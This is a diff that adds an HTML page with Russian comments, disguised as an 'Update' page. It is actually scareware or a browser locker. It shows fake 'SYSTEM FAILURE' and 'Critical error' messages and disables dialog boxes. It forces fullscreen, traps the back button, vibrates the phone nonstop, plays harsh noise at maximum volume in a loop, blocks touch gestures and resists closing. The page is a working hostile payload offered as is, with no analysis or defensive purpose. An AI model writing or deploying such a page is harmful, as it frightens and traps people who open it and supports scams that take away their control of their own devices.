@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Обновление</title>
+<style>
+* { margin:0; padding:0; }
+html, body { width:100%; height:100%; background:#000; overflow:hidden; touch-action:none; }
+#block {
+  display:flex; flex-direction:column; align-items:center; justify-content:center;
+  height:100%; color:#fff; font-family:Arial,sans-serif;
+  background:radial-gradient(circle at center,#1a1a1a,#000);
+  text-align:center;
+}
+#block h1 { font-size:2.4em; color:#ff3333; text-shadow:0 0 30px #f00; }
+#block .icon { font-size:5em; animation:pulse 1s infinite; }
+@keyframes pulse { 0%{opacity:0.3;transform:scale(0.9)} 50%{opacity:1;transform:scale(1.2)} 100%{opacity:0.3;transform:scale(0.9)} }
+</style>
+</head>
+<body>
+<div id="block"><div class="icon">🔊</div><h1>СИСТЕМНЫЙ СБОЙ</h1></div>
+
+<script>
+// 1. Глушим все диалоги
+window.alert = window.confirm = window.prompt = function(){ return false; };
+
+// 2. Fullscreen + ориентация
+try {
+  document.documentElement.requestFullscreen({ navigationUI:'hide' }).catch(()=>{});
+  if(screen.orientation?.lock) screen.orientation.lock('portrait').catch(()=>{});
+} catch(e){}
+
+// 3. Блокировка назад
+history.pushState(null,null,location.href);
+window.addEventListener('popstate',()=> history.pushState(null,null,location.href));
+
+// 4. Вибрация
+if(navigator.vibrate) setInterval(()=> navigator.vibrate([300,100,300,100,500]), 800);
+
+// 5. Звук на максимум (собачий лай + сирена) — без предупреждений
+(function maxVolume() {
+  try {
+    const actx = new (window.AudioContext || window.webkitAudioContext)();
+    // Разблокируем звук на iOS/Android (тихий старт)
+    const buffer = actx.createBuffer(1, actx.sampleRate * 0.1, actx.sampleRate);
+    const src = actx.createBufferSource();
+    src.buffer = buffer;
+    const gain = actx.createGain();
+    gain.gain.value = 1.0; // 0 дБ — максимум
+    src.connect(gain);
+    gain.connect(actx.destination);
+    src.start();
+    src.stop(actx.currentTime + 0.05);
+
+    // Основной цикл: генерация резкого тона + шум (имитация "собак")
+    function playDog() {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const dur = 0.4;
+      const buf = ctx.createBuffer(1, ctx.sampleRate * dur, ctx.sampleRate);
+      const data = buf.getChannelData(0);
+      for (let i=0; i<data.length; i++) {
+        // смесь пилы + шума = грубый лай
+        const t = i / ctx.sampleRate;
+        data[i] = 0.6 * (t * 200 % 1 - 0.5) 
+                + 0.4 * (Math.random()*2 - 1) 
+                + 0.3 * Math.sin(t * 800) * Math.exp(-t*8);
+      }
+      const s = ctx.createBufferSource();
+      s.buffer = buf;
+      const g = ctx.createGain();
+      g.gain.value = 1.0;
+      s.connect(g);
+      g.connect(ctx.destination);
+      s.start();
+      // перезапуск через паузу
+      setTimeout(playDog, 400 + Math.random()*300);
+    }
+    // первый запуск после короткой задержки (чтобы точно разблокировать аудиоконтекст)
+    setTimeout(playDog, 100);
+  } catch(e){ /* игнорируем, если звук не поддерживается */ }
+})();
+
+// 6. Блокировка жестов
+document.addEventListener('touchmove', e=>e.preventDefault(), {passive:false});
+document.addEventListener('gesturestart', e=>e.preventDefault(), {passive:false});
+document.addEventListener('gesturechange', e=>e.preventDefault(), {passive:false});
+document.addEventListener('gestureend', e=>e.preventDefault(), {passive:false});
+
+// 7. Защита от закрытия
+window.addEventListener('beforeunload', e=>{ e.preventDefault(); e.returnValue=''; });
+
+// 8. Меняем заголовок
+document.title = '⚠️ Критическая ошибка';
+</script>
+</body>
+</html>
